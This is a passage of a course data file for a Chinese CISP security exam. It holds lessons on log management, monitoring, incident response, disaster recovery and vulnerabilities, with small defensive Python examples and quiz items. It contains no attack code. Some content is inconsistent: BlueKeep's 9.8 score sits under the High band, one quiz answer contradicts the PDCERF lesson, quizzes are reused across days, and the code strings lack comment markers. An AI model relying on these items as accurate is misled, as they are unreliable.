**日志安全：**独立日志服务器(管理员不能删除)、WORM存储(一次写入多次读取)、加密传输(TLS)和存储、访问控制(安全审计员专属)\n\n## \n## 🔴 高频考点\n\n· Windows安全事件ID：**4624=登录成功、4625=登录失败**——两个号必须记住\n· 日志留存要求：网络安全法≥6个月、等保三级≥6个月、PCI DSS至少1年\n· **日志不可篡改**是底线——WORM存储+独立日志服务器+加密传输\n## 💜 记忆口诀\n\n· **事件ID**："4624进(登录成功)、4625拒(登录失败)、4672特权"\n· **三重防线**："不可篡改(WORM)、加密传输(TLS)、访问控制(审计员专属)"\n学习建议\n- Windows登录事件ID是最实用的日志分析入门点：4624(成功)/4625(失败)\n- ELK Stack是安全运营的基础设施\n- "日志不可篡改"是日志安全的底线',
    codeExample: {
      language: 'python',
      code: ` 日志分析示例\nimport re\nfrom collections import Counter\n\ndef analyze_access_log(log_lines):\n    ips = []\n    status_codes = []\n    for line in log_lines:\n        # 简单解析Apache日志\n        match = re.match(r"(\\S+).*\\s(\\d{3})\\s\\d+", line)\n        if match:\n            ips.append(match.group(1))\n            status_codes.append(int(match.group(2)))\n    \n    # 统计\n    ip_counts = Counter(ips).most_common(5)\n    status_counts = Counter(status_codes)\n    return ip_counts, status_counts\n\n# 模拟日志\nlogs = [\n    "192.168.1.1 - - GET /page HTTP/1.1 200 1234",\n    "192.168.1.1 - - GET /admin HTTP/1.1 401 123",\n    "192.168.1.2 - - GET /page HTTP/1.1 200 1234",\n    "192.168.1.1 - - GET /admin HTTP/1.1 401 123",\n]\nips, statuses = analyze_access_log(logs)\nprint(f"TOP IP: {ips}")\nprint(f"状态码: {dict(statuses)}")`,
      description: '演示日志分析',
    },
    quiz: [{"id":"q23-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q23-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q23-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q23-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q23-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-24', day: 24, week: 4, title: '安全监控',
    objectives: ['理解安全监控原理', '了解监控类型', '掌握告警管理'],
    content: '# 安全监控\n\n## 安全监控概念\n\n安全监控是通过技术手段持续监视系统和网络活动，发现安全威胁的过程。\n\n## 监控类型\n\n### 1. 网络监控\n- 流量监控\n- 异常流量检测\n- DDoS攻击检测\n\n### 2. 主机监控\n- 文件完整性监控\n- 进程监控\n- 注册表监控\n\n### 3. 应用监控\n- 登录失败监控\n- API异常调用\n- 权限提升检测\n\n### 4. 数据监控\n- 数据访问异常\n- 大量数据导出\n- 敏感数据访问\n\n## IDS/IPS\n\n### IDS（入侵检测系统）\n- 检测攻击\n- 产生告警\n- 不阻断流量\n- 监控模式：旁路\n\n### IPS（入侵防御系统）\n- 检测并阻断攻击\n- 主动防御\n- 串接部署\n\n### 检测方法\n1. **特征匹配**：已知攻击特征库\n2. **异常检测**：偏离正常基线\n3. **协议分析**：协议异常检测\n\n## SIEM系统\n\n### SIEM（安全信息和事件管理）\n- 收集多源日志\n- 关联分析\n- 统一告警\n- 合规报告\n\n### 主要功能\n- 日志聚合\n- 关联规则\n- 告警管理\n- 仪表板\n- 报告生成\n\n## 告警管理\n\n### 告警处理流程\n1. **接收告警**\n2. **初步分析**\n3. **确认/误报**\n4. **升级/处置**\n5. **关闭/记录**\n\n### 告警优化\n- 减少误报\n- 调整阈值\n- 关联告警\n- 优先级排序',
    codeExample: {
      language: 'python',
      code: ` 简单入侵检测\ndef detect_intrusion(events):\n    alerts = []\n    failed_login_count = 0\n    \n    for event in events:\n        if event["type"] == "login" and event["status"] == "fail":\n            failed_login_count += 1\n    \n    if failed_login_count >= 5:\n        alerts.append({\n            "level": "HIGH",\n            "msg": f"检测到暴力破解: {failed_login_count}次失败登录"\n        })\n    \n    return alerts\n\n# 模拟事件\nevents = [\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n    {"type": "login", "status": "fail"},\n]\n\nalerts = detect_intrusion(events)\nfor alert in alerts:\n    print(f"[{alert['level']}] {alert['msg']}")`,
      description: '演示简单入侵检测',
    },
    quiz: [{"id":"q24-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q24-2","question":"以下关于安全监控的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q24-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q24-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q24-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-25', day: 25, week: 4, title: '事件响应流程',
    objectives: ['理解事件响应概念', '了解响应流程阶段', '掌握处置方法'],
    content: '# 事件响应流程\n\n> 📋 **本节大纲**\u2003PDCERF六阶段详解(P→D→C→E→R→F,含遏制优先原则) | 事件优先级分类P0-P3 | CSIRT团队 | 证据处理\n\n## 概述\n\n事件响应（Incident Response）是安全运营的核心——当安全事件爆发，如何快速有效地"止血+清创+恢复"。PDCERF是全球公认的六阶段响应模型。CISP考试中，每阶段的任务顺序和"遏制优先于根除"的逻辑是重点。\n\n## PDCERF六阶段详解\n\n### P - 准备（Preparation）\n事前的"练兵"：组建CSIRT团队(明确各角色)、制定书面应急响应计划、部署SIEM/EDR等监控工具、建立通报机制(内部+监管部门)、**定期演练**(不演练=没计划)。准备越充分，响应越快。\n\n### D - 检测与分析（Detection & Analysis）\n从SIEM告警、用户报告、外部通报等渠道发现事件。核心工作：判断是真攻击还是误报?危害范围多大?数据是否外泄?攻击还在继续吗?关键是快速准确——误判可能导致错误处置或延误。\n\n### C - 遏制（Containment）\n**"止血"——最紧急的步骤！**\n- 短期遏制(立即)：断网/隔离服务器、封禁攻击IP、冻结被攻破账户\n- 长期遏制(后续)：加固防火墙规则、修补临时漏洞、更换凭据\n- 关键原则：遏制优先于根除——先止血，再清创。不要先花时间研究攻击手法而放任攻击持续。\n\n### E - 根除（Eradication）\n**"清创"：**彻底移除攻击者的所有痕迹——删除恶意软件/后门/Webshell、修补被利用的漏洞(CVE)、重置所有被攻破账户密码、检查是否还有其他后门。确保攻击者无法轻易再次进入。\n\n### R - 恢复（Recovery）\n从干净备份恢复数据和系统→验证完整性(哈希校验)→先恢复最关键系统→逐步上线→持续监控是否有异常→确认完全干净后宣布恢复完成。\n\n### F - 跟进（Follow-up / Lessons Learned）\n事后复盘——事件是怎么发生的?(根本原因)→我们的响应哪里做得好/不好?→流程有什么漏洞需要修复?→更新应急响应计划。形成事件报告存档。\n\n## 事件优先级分类\n\n| 级别 | 定义 | 示例 | 响应要求 |\n|------|------|------|---------|\n| P0 | 重大安全事件 | 核心系统被攻破、大规模数据泄露 | 立即响应，全团队动员 |\n| P1 | 严重事件 | 单系统被入侵、DDoS致服务中断 | 30分钟内启动响应 |\n| P2 | 一般事件 | 钓鱼邮件攻击、恶意软件感染单机 | 4小时内处置 |\n| P3 | 轻微事件 | 端口扫描告警、小幅异常流量 | 24小时内分析 |\n\n## 证据处理原则\n\n如果事件可能演变为法律诉讼，必须保护证据链：\n- **不修改原始数据：**先做磁盘镜像(mirror copy)，在原盘镜像上分析而非在原始盘上操作\n- **证据链记录(Chain of Custody)：**谁在何时接触过证据、做了什么操作——全程书面记录\n- **易失性证据优先：**先收集内存(关机即丢失)→网络连接→进程列表→最后才是硬盘\n\n## \n## 🔴 高频考点\n\n· **PDCERF六步顺序**必须背：P准备→D检测→C遏制→E根除→R恢复→F跟进\n· 最紧急步骤是**C遏制**(止血)——"遏制优先于根除"是第一条铁律\n· 取证时**易失性证据优先**：内存→网络连接→进程列表→硬盘\n## 💜 记忆口诀\n\n· **PDCERF六字**："准-检-堵-清-复-盘"\n· **最紧急**："不先清先堵——先止血再清创"\n· **取证顺序**："先内存(丢得快)→再网络→再进程→最后硬盘"\n学习建议\n- PDCERF六步顺序必须牢记：P→D→C→E→R→F\n- C(遏制)是在发现攻击后最紧急的步骤——"先止血"\n- 易失性证据优先收集是取证的基本规则',
    codeExample: {
      language: 'python',
      code: ` 事件响应状态机\nclass IncidentResponder:\n    def __init__(self):\n        self.stage = "初始状态"\n    \n    def next_stage(self):\n        stages = ["检测", "遏制", "根除", "恢复", "总结"]\n        if self.stage == "初始状态":\n            self.stage = stages[0]\n        elif self.stage in stages[:-1]:\n            self.stage = stages[stages.index(self.stage) + 1]\n        return self.stage\n    \n    def handle_event(self, event_type):\n        actions = {\n            "malware": ["隔离主机", "清除恶意软件", "更新防病毒"],\n            "phishing": ["隔离邮件", "通知用户", "更新规则"],\n            "data_leak": ["隔离系统", "溯源分析", "通知合规"]\n        }\n        return actions.get(event_type, ["分析事件", "采取措施"])\n\nir = IncidentResponder()\nprint("事件响应流程:")\nfor _ in range(5):\n    print(f" -> {ir.next_stage()}")\nprint(f"\\n勒索软件处置: {ir.handle_event('malware')}")`,
      description: '演示事件响应流程',
    },
    quiz: [{"id":"q25-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q25-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q25-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q25-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q25-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-26', day: 26, week: 4, title: '应急响应',
    objectives: ['理解应急响应原则', '了解常见事件处置', '掌握恢复方法'],
    content: '# 应急响应\n\n## 应急响应原则\n\n### 1. 快速响应\n- 时间越短，损失越小\n- 快速决策，快速行动\n\n### 2. 最小影响\n- 尽量减少业务中断\n- 隔离而非停机\n\n### 3. 保护证据\n- 不修改原始系统\n- 保留攻击痕迹\n- 记录所有操作\n\n### 4. 持续沟通\n- 内部通报\n- 客户沟通\n- 监管报告\n\n## 常见安全事件处置\n\n### 1. 勒索软件\n\n#### 识别\n- 文件被加密\n- 出现勒索信息\n- 大量文件重命名\n\n#### 处置\n1. 隔离受影响系统\n2. 识别感染源\n3. 评估损失\n4. 从备份恢复\n5. 修复漏洞\n\n#### 预防\n- 定期备份（离线备份）\n- 员工培训\n- 漏洞修复\n\n### 2. Web应用入侵\n\n#### 识别\n- Web Shell发现\n- 异常登录\n- 网页被篡改\n\n#### 处置\n1. 隔离Web服务器\n2. 分析攻击向量\n3. 清除Web Shell\n4. 修复漏洞\n5. 恢复网站\n\n### 3. 数据泄露\n\n#### 识别\n- 异常数据访问\n- 大量数据导出\n- 外部举报\n\n#### 处置\n1. 阻止数据继续泄露\n2. 溯源分析\n3. 通知受影响方\n4. 合规报告\n\n## 恢复策略\n\n### 1. 从备份恢复\n- 验证备份完整性\n- 恢复到新系统\n- 不覆盖原始证据\n\n### 2. 重建系统\n- 使用可信镜像\n- 重新部署应用\n- 验证系统完整性\n\n### 3. 补偿措施\n- 临时防护措施\n- 加强监控\n- 增加日志级别',
    codeExample: {
      language: 'python',
      code: ` 应急响应决策系统\ndef get_response_actions(event_type, severity):\n    actions = {\n        "ransomware": {\n            "critical": ["立即隔离系统", "断开网络", "启动应急预案"],\n            "high": ["隔离感染主机", "检查扩散情况", "准备恢复"],\n        },\n        "web_intrusion": {\n            "high": ["下线可疑服务", "检查Web Shell", "分析访问日志"],\n        },\n        "phishing": {\n            "medium": ["隔离钓鱼邮件", "通知收件人", "更新邮件规则"],\n        }\n    }\n    return actions.get(event_type, {}).get(severity, ["分析事件", "采取适当措施"])\n\n# 测试\nprint("勒索软件(严重):")\nprint(get_response_actions("ransomware", "critical"))\nprint("\\n钓鱼邮件(中):")\nprint(get_response_actions("phishing", "medium"))`,
      description: '演示应急响应决策',
    },
    quiz: [{"id":"q26-1","question":"SOC的全称是什么？","options":["System Operation Center","Security Operations Center","Server Operations Console","Security Online Check"],"correctIndex":1,"explanation":"SOC是Security Operations Center的缩写。"},{"id":"q26-2","question":"应急响应PDCERF模型中，第一步是？","options":["根除（Eradication）","检测（Detection）","准备（Preparation）","恢复（Recovery）"],"correctIndex":2,"explanation":"PDCERF：准备->检测->抑制->根除->恢复->跟踪。"},{"id":"q26-3","question":"SIEM系统的主要功能不包括？","options":["日志收集和分析","安全事件关联分析","发送营销邮件","告警和报表"],"correctIndex":2,"explanation":"SIEM不负责发送营销邮件。"},{"id":"q26-4","question":"安全事件中，事件和事故的区别是？","options":["完全相同","事件是可观测现象，事故是已造成损害的事件","事件比事故严重","没有区别"],"correctIndex":1,"explanation":"事件是可能影响安全的现象，事故是已造成实际损害的安全事件。"},{"id":"q26-5","question":"应急响应中保留证据的正确顺序是？","options":["先关机保存硬盘","先保留内存镜像再保留磁盘镜像","直接格式化系统","只保留日志文件"],"correctIndex":1,"explanation":"应首先保留易失性证据（内存），再保留非易失性证据（磁盘）。"}],
    expertNotes: dayExpertNotes[22],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-27', day: 27, week: 4, title: '灾难恢复',
    objectives: ['理解灾难恢复概念', '了解DR策略', '掌握BCP要点'],
    content: '# 灾难恢复\n\n## 基本概念\n\n### RTO（恢复时间目标）\n- 灾难发生后，多久恢复业务\n- 例如：4小时\n\n### RPO（恢复点目标）\n- 可接受的数据丢失时间\n- 例如：1小时\n\n### 关系\n- RTO越小，成本越高\n- RPO越小，数据丢失越少\n\n## 灾难类型\n\n### 1. 技术故障\n- 服务器故障\n- 网络中断\n- 数据中心故障\n\n### 2. 人为因素\n- 误操作\n- 恶意破坏\n- 内部攻击\n\n### 3. 自然灾难\n- 火灾、洪水\n- 地震、台风\n\n### 4. 安全事件\n- 勒索软件\n- 大规模入侵\n- DDoS攻击\n\n## 恢复策略\n\n### 1. 冷备（Cold Site）\n- 基础设施就绪\n- 需要部署和配置\n- RTO：数天\n- 成本低\n\n### 2. 温备（Warm Site）\n- 部分设备就绪\n- 数据定期同步\n- RTO：数小时\n- 成本中等\n\n### 3. 热备（Hot Site）\n- 实时数据同步\n- 随时可切换\n- RTO：数分钟\n- 成本高\n\n### 4. 多云/混合云\n- 跨云服务商\n- 高可用性\n- 灵活扩展\n\n## BCP（业务持续性计划）\n\n### BCP内容\n1. 风险评估\n2. 业务影响分析\n3. 恢复策略\n4. 应急组织\n5. 通信计划\n6. 测试和演练\n\n### 关键指标\n- MTBF（平均故障间隔）\n- MTTR（平均修复时间）\n\n## 备份策略\n\n### 备份类型\n1. **完全备份**：备份所有数据\n2. **增量备份**：备份自上次备份后的变化\n3. **差异备份**：备份自上次完全备份后的变化\n\n### 3-2-1原则\n- **3**份副本\n- **2**种介质\n- **1**份异地',
    codeExample: {
      language: 'python',
      code: ` RTO/RPO评估示例\ndef evaluate_dr_strategy(rto_hours, rpo_hours, budget):\n    if rto_hours <= 1 and rpo_hours <= 1:\n        level = "热备"\n    elif rto_hours <= 4 and rpo_hours <= 4:\n        level = "温备"\n    else:\n        level = "冷备"\n    \n    recommendations = {\n        "热备": ["实时数据同步", "自动故障转移", "高可用架构"],\n        "温备": ["定期数据同步", "手动/半自动切换", "快速部署能力"],\n        "冷备": ["定期备份", "详细部署文档", "演练计划"]\n    }\n    return level, recommendations[level]\n\n# 评估\nlevel, recs = evaluate_dr_strategy(rto_hours=2, rpo_hours=2, budget=100000)\nprint(f"策略级别: {level}")\nprint(f"建议措施: {', '.join(recs)}")`,
      description: '演示DR策略评估',
    },
    quiz: [{"id":"q27-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q27-2","question":"以下关于灾难恢复的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q27-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q27-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q27-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-28', day: 28, week: 4, title: '第四周总结与测验',
    objectives: ['回顾第四周知识点', '检验学习成果', '为第五周做准备'],
    content: '# 第四周学习总结\n\n## 本周学习内容\n\n### Day 22: 安全运营概述\n- SOC职能和组成\n- 安全运营流程\n\n### Day 23: 日志管理\n- 日志类型和收集\n- ELK Stack\n- 日志分析方法\n\n### Day 24: 安全监控\n- IDS/IPS区别\n- SIEM系统\n- 告警管理\n\n### Day 25: 事件响应流程\n- 六个阶段：准备→检测→遏制→根除→恢复→总结\n- CSIRT团队\n\n### Day 26: 应急响应\n- 常见事件处置（勒索软件、Web入侵、数据泄露）\n\n### Day 27: 灾难恢复\n- RTO/RPO\n- 冷备/温备/热备\n- 3-2-1备份原则\n\n## 知识要点\n\n| 主题 | 核心内容 |\n|------|----------|\n| SOC | 7x24监控、威胁检测、事件响应 |\n| IDS/IPS | 检测vs阻断 |\n| SIEM | 日志聚合、关联分析、统一告警 |\n| RTO | 恢复时间目标 |\n| RPO | 恢复点目标 |\n| 备份 | 3-2-1原则 |\n\n## 下周预告\n\n第五周将学习漏洞与攻击：\n- 漏洞概述\n- OWASP Top 10\n- 渗透测试\n- 漏洞管理',
    quiz: [{"id":"q28-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q28-2","question":"以下关于第四周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q28-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q28-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q28-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: [{"author":"张伟","title":"安全架构设计思考","content":"CISP考试中安全架构部分的重点是理解纵深防御（Defense in Depth）原则。不要只依赖单一安全措施——好的安全架构就像洋葱，一层层包裹。实际工作中，建议每个项目都从威胁建模开始，用STRIDE方法论系统梳理风险点。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"安全运维实战心得","content":"很多人在安全运维中忽略了日志管理——这恰恰是溯源和取证的关键。建议建立集中日志平台（如ELK/Splunk），设置关键告警规则，并定期进行日志审计演练。SOC建设的第一步永远是日志标准化。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"安全管理体系建设","content":"信息安全管理不是技术人员的专属责任——它是全员参与的系统工程。PDCA循环是信息安全管理的核心框架。建议从建立资产清单开始——连自己有什么都不知道就没法保护。安全是持续改进的过程。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'splunk',
      name: 'Splunk',
      description: '企业级日志分析与SIEM平台',
      url: ''
    },
    {
      id: 'elk',
      name: 'ELK Stack',
      description: 'Elasticsearch + Logstash + Kibana 日志分析栈',
      url: ''
    },
    {
      id: 'suricata',
      name: 'Suricata',
      description: '开源入侵检测/防御系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'siem-lab',
      name: 'SIEM 日志分析实验',
      description: '企业安全运营中心SOC模拟环境',
      url: ''
    }
  ]
  },
  // ========== Week 5: 漏洞与攻击 ==========
  {
    id: 'day-29', day: 29, week: 5, title: '漏洞概述',
    objectives: ['理解漏洞概念', '了解漏洞类型', '掌握漏洞生命周期'],
    content: '# 漏洞概述\n\n> 📋 **本节大纲**\u2003漏洞四大来源(软件/配置/设计/人为) | CVSS评分体系 | 漏洞生命周期 | CVE/CNVD数据库 | 零日漏洞\n\n## 什么是漏洞\n\n漏洞（Vulnerability）是信息系统在设计、实现、配置或管理中存在的弱点，可能被威胁利用以破坏系统安全性。ISO 27005定义："资产或控制中可能被威胁利用的弱点"。\n\n## 漏洞四大来源分类\n\n**1. 软件漏洞（代码缺陷）：**缓冲区溢出、SQL注入、XSS、使用不安全的函数(strcpy代替strncpy)、竞态条件。根因：开发人员的安全编码意识和技能不足。\n\n**2. 配置漏洞（部署错误）：**默认密码未改(admin/admin)、不必要的服务开启(Telnet/FTP)、云存储桶公开访问、错误权限配置。根因：缺乏安全基线检查。\n\n**3. 设计漏洞（架构缺陷）：**缺少认证机制、无权限分级、信任客户端输入而不验证、身份验证逻辑缺陷。根因：需求分析阶段未考虑安全。\n\n**4. 人为漏洞（Human Factor）：**弱密码、被社会工程学欺骗、误操作删除数据、共享账户。根因：安全意识薄弱。\n\n## CVSS评分体系（必考）\n\nCVSS v3.1将漏洞严重度分为0-10分：\n- **严重(Critical) 9.0-10.0：**可远程利用、无需用户交互、导致完全系统控制。如Log4Shell(CVE-2021-44228, 10.0)\n- **高危(High) 7.0-8.9：**需要一定条件，但影响严重。如BlueKeep(CVE-2019-0708, 9.8)\n- **中危(Medium) 4.0-6.9：**有限影响或利用条件苛刻\n- **低危(Low) 0.1-3.9：**影响小或几乎不可利用\n\n评分维度：攻击向量AV、复杂度AC、权限要求PR、用户交互UI、影响范围S、C/I/A影响\n\n## 漏洞生命周期\n\n**发现** → 研究人员/白帽/厂商发现漏洞\n**报告** → 向厂商或CVE编号机构报告（CNVD/CNNVD）\n**验证** → 厂商确认漏洞存在且可复现\n**修复** → 开发商开发补丁或缓解措施\n**披露** → 负责任披露（给厂商修复时间后再公开）vs 完全披露（立即公开）\n**用户部署** → 